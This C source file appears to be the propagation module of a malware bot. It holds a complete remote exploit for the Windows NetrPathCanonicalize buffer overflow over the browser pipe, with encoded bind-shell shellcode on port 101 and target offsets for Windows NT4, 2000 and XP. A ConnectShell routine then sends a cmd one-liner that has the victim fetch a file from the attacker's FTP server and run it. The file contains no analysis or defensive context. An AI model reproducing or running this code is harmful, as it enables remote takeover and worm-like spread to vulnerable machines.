#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_NETAPI

#include <cmath>
#pragma comment( lib, "mpr.lib" )

#define _CRT_SECURE_NO_DEPRECATE
#define MAX_FRAG_SIZE	( 4280 )
#define PATH_SIZE		( 1064 )
#define MAX_TRIES		( 2 )
#define TRY_TIMEOUT		( 1000 )

unsigned char scode[] = // port=101
"\x33\xC9\x83\xE9\xAF\xD9\xEE\xD9\x74\x24\xF4\x5B\x81\x73\x13\xBB"
"\x1E\xD3\x6A\x83\xEB\xFC\xE2\xF4\x47\x74\x38\x25\x53\xE7\x2C\x95"
"\x44\x7E\x58\x06\x9F\x3A\x58\x2F\x87\x95\xAF\x6F\xC3\x1F\x3C\xE1"
"\xF4\x06\x58\x35\x9B\x1F\x38\x89\x8B\x57\x58\x5E\x30\x1F\x3D\x5B"
"\x7B\x87\x7F\xEE\x7B\x6A\xD4\xAB\x71\x13\xD2\xA8\x50\xEA\xE8\x3E"
"\x9F\x36\xA6\x89\x30\x41\xF7\x6B\x50\x78\x58\x66\xF0\x95\x8C\x76"
"\xBA\xF5\xD0\x46\x30\x97\xBF\x4E\xA7\x7F\x10\x5B\x7B\x7A\x58\x2A"
"\x8B\x95\x93\x66\x30\x6E\xCF\xC7\x30\x5E\xDB\x34\xD3\x90\x9D\x64"
"\x57\x4E\x2C\xBC\x8A\xC5\xB5\x39\xDD\x76\xE0\x58\xD3\x69\xA0\x58"
"\xE4\x4A\x2C\xBA\xD3\xD5\x3E\x96\x80\x4E\x2C\xBC\xE4\x97\x36\x0C"
"\x3A\xF3\xDB\x68\xEE\x74\xD1\x95\x6B\x76\x0A\x63\x4E\xB3\x84\x95"
"\x6D\x4D\x80\x39\xE8\x4D\x90\x39\xF8\x4D\x2C\xBA\xDD\x76\xD3\x0F"
"\xDD\x4D\x5A\x8B\x2E\x76\x77\x70\xCB\xD9\x84\x95\x6D\x74\xC3\x3B"
"\xEE\xE1\x03\x02\x1F\xB3\xFD\x83\xEC\xE1\x05\x39\xEE\xE1\x03\x02"
"\x5E\x57\x55\x23\xEC\xE1\x05\x3A\xEF\x4A\x86\x95\x6B\x8D\xBB\x8D"
"\xC2\xD8\xAA\x3D\x44\xC8\x86\x95\x6B\x78\xB9\x0E\xDD\x76\xB0\x07"
"\x32\xFB\xB9\x3A\xE2\x37\x1F\xE3\x5C\x74\x97\xE3\x59\x2F\x13\x99"
"\x11\xE0\x91\x47\x45\x5C\xFF\xF9\x36\x64\xEB\xC1\x10\xB5\xBB\x18"
"\x45\xAD\xC5\x95\xCE\x5A\x2C\xBC\xE0\x49\x81\x3B\xEA\x4F\xB9\x6B"
"\xEA\x4F\x86\x3B\x44\xCE\xBB\xC7\x62\x1B\x1D\x39\x44\xC8\xB9\x95"
"\x44\x29\x2C\xBA\x30\x49\x2F\xE9\x7F\x7A\x2C\xBC\xE9\xE1\x03\x02"
"\x54\xD0\x33\x0A\xE8\xE1\x05\x95\x6B\x1E\xD3\x6A";

unsigned char stack[] = "\x81\xc4\xff\xef\xff\xff\x44";
typedef struct
{
	const char *pszName;
	size_t nPathLen;
	size_t nOffsetStartAddr;
	size_t nShellCodeAddr;
	bool bIsWinXP;
} Target;
Target Targets[] =
{
	{ "Windows NT4, 2000 (SP0-SP4)",1066,	1000,	600,	true },
	{ "Windows XP (SP0+SP1)",		710,	612,	0,		true },
};
unsigned long nOffset1 = 0x00020804;
unsigned long nOffset2 = nOffset1 + 6;
#pragma pack( 1 )
typedef unsigned char UINT8;
typedef unsigned short UINT16;
typedef struct
{
	UINT32 maxlength;
	UINT32 offset;
	UINT32 length;
} UNISTR2;
typedef struct
{
	UINT8 versionmaj;
	UINT8 versionmin;
	UINT8 type;
	UINT8 flags;
	UINT32 representation;
	UINT16 fraglength;
	UINT16 authlength;
	UINT32 callid;
} RPC_Header;
typedef struct
{
	UINT8 byte[16];
	UINT32 version;
} RPC_Iface;
typedef struct
{
	RPC_Header NormalHeader;
	
	UINT16 maxtsize;
	UINT16 maxrsize;
	UINT32 assocgid;
	UINT32 numelements;
	UINT16 contextid;
	UINT8 numsyntaxes;

	UINT8 align;

	RPC_Iface Interface1;
	RPC_Iface Interface2;
} RPC_ReqBind;
typedef struct
{
	RPC_Header NormalHeader;

	UINT32 allochint;
	UINT16 prescontext;
	UINT16 opnum;
} RPC_ReqNorm;
typedef struct
{
	UINT32 ReferendID;
	UNISTR2 Server;
	wchar_t Server_Data;
	char align[ 2 ];
} NetrPathCanonicalize_Start;
typedef struct
{
	UINT32 OutBufLen;
	UNISTR2 Prefix;
	wchar_t Prefix_Data[ 2 ];
	UINT32 Type;
	UINT32 Flags;
} NetrPathCanonicalize_End;
#pragma pack()

bool SendReqPacket_Part( HANDLE hPipe, RPC_ReqNorm pPacketHeader, unsigned char *pStubData, size_t nDataLen, UINT16 nMaxSize, bool bFirst )
{
	bool bSendNext;
	unsigned char *pPacket;
	DWORD nBytesWritten;
	if( bFirst )
		pPacketHeader.NormalHeader.flags |= 1;
	else
		pPacketHeader.NormalHeader.flags &= ~1;
	if( ( nDataLen + sizeof( RPC_ReqNorm ) ) <= nMaxSize )
	{
		pPacketHeader.NormalHeader.fraglength	= (UINT16)( nDataLen + sizeof( RPC_ReqNorm ) );
		pPacketHeader.allochint					= (UINT32)nDataLen;
		pPacketHeader.NormalHeader.flags		|= 2;
		bSendNext = false;
	}
	else
	{
		pPacketHeader.NormalHeader.fraglength	= (UINT16)nMaxSize;
		pPacketHeader.allochint					= nMaxSize - sizeof( RPC_ReqNorm );
		pPacketHeader.NormalHeader.flags		&= ~2;
		bSendNext = true;
	}
	pPacket = (unsigned char*)malloc( pPacketHeader.NormalHeader.fraglength );
	if( !pPacket )
		return false;
	*(RPC_ReqNorm*)pPacket = pPacketHeader;
	memcpy( &pPacket[ sizeof( RPC_ReqNorm ) ], pStubData, pPacketHeader.allochint );
	if( !WriteFile( hPipe, pPacket, pPacketHeader.NormalHeader.fraglength, &nBytesWritten, NULL ) ||
		nBytesWritten != pPacketHeader.NormalHeader.fraglength )
	{
		free( pPacket );
		return false;
	}
	free( pPacket );
	if( bSendNext )
		return SendReqPacket_Part( hPipe, pPacketHeader, pStubData + pPacketHeader.allochint, nDataLen - pPacketHeader.allochint, nMaxSize, false );
	else
		return true;
}

bool exnetapi(char ip[16], int nTarget)
{
	char szIPC[ 8192 ];
	NETRESOURCE NetSource;
	DWORD nNullSessionError;
	char szPipe[ 8192 ];
	HANDLE hPipe;
	RPC_ReqBind BindPacket;
	DWORD nBytesWritten;
	DWORD nBytesRead;
	unsigned char RecvBuff[ 8192 ];
	NetrPathCanonicalize_Start PStart;
	NetrPathCanonicalize_End PEnd;
	size_t nPathLen;
	size_t nBufferPos;
	unsigned char *pPath;
	size_t nPacketSize;
	unsigned char *pPacket;
	RPC_ReqNorm ReqNormalHeader;
	bool bExit;
	int nCount;
	OVERLAPPED ov;
	if( _stricmp( ip, "." ) )
	{
		_snprintf( szIPC, sizeof( szIPC ), "\\\\%s\\ipc$", ip );
		memset( &NetSource, 0 ,sizeof( NetSource ) );
		NetSource.lpRemoteName = szIPC;
		nNullSessionError = WNetAddConnection2( &NetSource, "", "", 0 );
	}
	_snprintf( szPipe, sizeof( szPipe ), "\\\\%s\\pipe\\browser", ip );
	hPipe = CreateFile( szPipe,
		GENERIC_WRITE | GENERIC_READ,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED,
		NULL );
	if( hPipe == INVALID_HANDLE_VALUE )
		return false;
	memset( &BindPacket, 0, sizeof( BindPacket ) );
	BindPacket.NormalHeader.versionmaj		= 5;
	BindPacket.NormalHeader.versionmin		= 0;
	BindPacket.NormalHeader.type			= 11;
	BindPacket.NormalHeader.flags			= 3;
	BindPacket.NormalHeader.representation	= 0x00000010;
	BindPacket.NormalHeader.fraglength		= sizeof( BindPacket );
	BindPacket.NormalHeader.authlength		= 0;
	BindPacket.NormalHeader.callid			= 0;
	BindPacket.maxtsize						= MAX_FRAG_SIZE;
	BindPacket.maxrsize						= MAX_FRAG_SIZE;
	BindPacket.assocgid						= 0;
	BindPacket.numelements					= 1;
	BindPacket.contextid					= 0;
	BindPacket.numsyntaxes					= 1;
	memcpy( BindPacket.Interface1.byte, "\xC8\x4F\x32\x4B\x70\x16\xD3\x01\x12\x78\x5A\x47\xBF\x6E\xE1\x88", 16 );
	BindPacket.Interface1.version			= 3;
	memcpy( BindPacket.Interface2.byte, "\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60", 16 );
	BindPacket.Interface2.version			= 2;
	if( !WriteFile( hPipe, &BindPacket, sizeof( RPC_ReqBind ), &nBytesWritten, NULL ) )
	{
		CloseHandle( hPipe );
		return false;
	}
	ReadFile( hPipe, RecvBuff, sizeof( RecvBuff ), &nBytesRead, NULL );
	srand( (int)time( NULL ) );
	memset( &PStart, 0x41, sizeof( PStart ) );
	memset( &PEnd, 0x41, sizeof( PEnd ) );
	PStart.ReferendID		= rand();
	PStart.Server.length	= 1;
	PStart.Server.offset	= 0;
	PStart.Server.maxlength = 1;
	PStart.Server_Data		= L'';
	if( Targets[ nTarget ].bIsWinXP )
	{
		PEnd.Prefix.length		= 1;
		PEnd.Prefix.offset		= 0;
		PEnd.Prefix.maxlength	= 1;
		memcpy( PEnd.Prefix_Data, "\x00\x00\x00\x00", 4 );
	}
	else
	{
		PEnd.Prefix.length		= 2;
		PEnd.Prefix.offset		= 0;
		PEnd.Prefix.maxlength	= 2;
		memcpy( PEnd.Prefix_Data, "\xeb\x02\x00\x00", 4 );
	}
	PEnd.OutBufLen			= rand() % 250 + 1;
	PEnd.Type				= rand() % 250 + 1;;
	PEnd.Flags				= 0;
	nPathLen = Targets[ nTarget ].nPathLen;
	pPath = (unsigned char*)malloc( nPathLen );
	if( !pPath )
	{
		CloseHandle( hPipe );
		return false;
	}
	memset( pPath, 0x90, nPathLen - 2 );
	memset( pPath + nPathLen - 2, 0, 2 );
	nBufferPos = Targets[ nTarget ].nShellCodeAddr;
	memcpy( pPath + nBufferPos, stack, sizeof( stack ) - 1 );
	nBufferPos += sizeof( stack ) - 1;
	memcpy( pPath + nBufferPos, scode, sizeof( scode ) - 1 );
	nBufferPos += sizeof( scode ) - 1;
	nBufferPos = Targets[ nTarget ].nOffsetStartAddr;
	if( Targets[ nTarget ].bIsWinXP )
	{
		memcpy( pPath + nBufferPos, &nOffset2, sizeof( nOffset1 ) );
		nBufferPos += 4;
		nBufferPos += 8;
		memcpy( pPath + nBufferPos, &nOffset1, sizeof( nOffset1 ) );
		nBufferPos += 4;
		nBufferPos += 32;
		memcpy( pPath + nBufferPos, &nOffset1, sizeof( nOffset1 ) );
		nBufferPos += 4;
		nBufferPos += 8;
		memcpy( pPath + nBufferPos, &nOffset1, sizeof( nOffset1 ) );
		nBufferPos += 4;
		nBufferPos += 32;
		nBufferPos += sizeof( wchar_t );
	}
	else
	{
		for( size_t n = 0; n < 16; n++ )
			memcpy( pPath + nBufferPos + ( n * sizeof( nOffset1 ) ), &nOffset1, sizeof( nOffset1 ) );
	}
	nPacketSize = 
		  sizeof( PStart )
		+ sizeof( UNISTR2 )
		+ nPathLen + sizeof( wchar_t ) + 4
		+ sizeof( NetrPathCanonicalize_End );
	pPacket = (unsigned char*)malloc( nPacketSize );
	if( !pPacket )
	{
		CloseHandle( hPipe );
		free( pPath );
		return false;
	}
	memset( pPacket, 0, nPacketSize );
	nBufferPos = 0;
	memcpy( pPacket, &PStart, sizeof( PStart ) );
	nBufferPos += sizeof( NetrPathCanonicalize_Start );

	( (UNISTR2*)( pPacket + nBufferPos ) )->length		= (UINT32)ceil( (float)nPathLen / sizeof( wchar_t ) );
	( (UNISTR2*)( pPacket + nBufferPos ) )->offset		= 0;
	( (UNISTR2*)( pPacket + nBufferPos ) )->maxlength	= ( (UNISTR2*)( pPacket + nBufferPos ) )->length;
	nBufferPos += sizeof( UNISTR2 );
	memcpy( pPacket + nBufferPos, pPath, nPathLen );
	nBufferPos += nPathLen;
	while( nBufferPos % 4 )
		nBufferPos++;
	memcpy( pPacket + nBufferPos, &PEnd, sizeof( PEnd ) );
	nBufferPos += sizeof( PEnd );
	free( pPath );
	memset( &ReqNormalHeader, 0, sizeof( ReqNormalHeader ) );
	ReqNormalHeader.NormalHeader.versionmaj		= 5;
	ReqNormalHeader.NormalHeader.versionmin		= 0;
	ReqNormalHeader.NormalHeader.type			= 0;
	ReqNormalHeader.NormalHeader.flags			= 3;
	ReqNormalHeader.NormalHeader.representation	= 0x00000010;
	ReqNormalHeader.NormalHeader.authlength		= 0;
	ReqNormalHeader.NormalHeader.callid			= 0;
	ReqNormalHeader.prescontext					= 0;
	ReqNormalHeader.opnum						= 0x1f;
	memset( &ov, 0, sizeof( ov ) );
	ov.hEvent	= CreateEvent( NULL, TRUE, FALSE, NULL );
	bExit		= false;
	nCount		= 0;
	while( !bExit && nCount < MAX_TRIES )
	{
		nCount++;
		if( !SendReqPacket_Part( hPipe, ReqNormalHeader, pPacket, nBufferPos, MAX_FRAG_SIZE, true ) )
			break;
		if( ov.hEvent )
		{
			
			if( !ReadFile( hPipe, RecvBuff, sizeof( RecvBuff ), &nBytesRead, &ov ) && GetLastError() != ERROR_IO_PENDING )
				return false;
			else
			{
				if( WaitForSingleObject( ov.hEvent, TRY_TIMEOUT ) == WAIT_TIMEOUT )
				{
					//printf("Shell on %s, port 101!\n", ip);
					bExit = true;
				}
			}

		}
	}
	CloseHandle( hPipe );
	free( pPacket );
	if( ov.hEvent )
		CloseHandle( ov.hEvent );
	if (bExit)
		return true;
	return false;
}

BOOL ConnectShell(EXINFO exinfo, unsigned short connectport) {
	int len;
	char recvbuf[1024];
	char mkdir_buff[400];

	SOCKET sockfd;
	SOCKADDR_IN shell_addr;
	ZeroMemory(&shell_addr, sizeof(shell_addr));

	shell_addr.sin_family = AF_INET;
	shell_addr.sin_addr.s_addr = inet_addr(exinfo.ip);
	shell_addr.sin_port = htons(connectport);

	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return FALSE;
	if (connect(sockfd,(LPSOCKADDR)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) 
		return FALSE;

	len = recv(sockfd, recvbuf, 1024, 0);

	_snprintf(mkdir_buff, sizeof(mkdir_buff), 
		"cmd /c echo open %s %d >> ii &echo user 1 1 >> ii &echo get %s >> ii &echo bye >> ii &ftp -n -v -s:ii &del ii &%s\r\n",
		GetIP(exinfo.sock),ftpport, filename, filename);

	if (send(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
		return FALSE;

	len = recv(sockfd, recvbuf, 1024, 0);
	closesocket(sockfd);
	return TRUE;
}

BOOL NETAPIExploit(EXINFO exinfo) {

	unsigned int i;

	for (i = 0; i < 2; i++) {
		if (exnetapi(exinfo.ip, i)) {		
			if (ConnectShell(exinfo, 101)) {			
				return TRUE;
			}
		}
		if (i == 0) 
			Sleep(2000);
	}

	return TRUE;
}

#endif
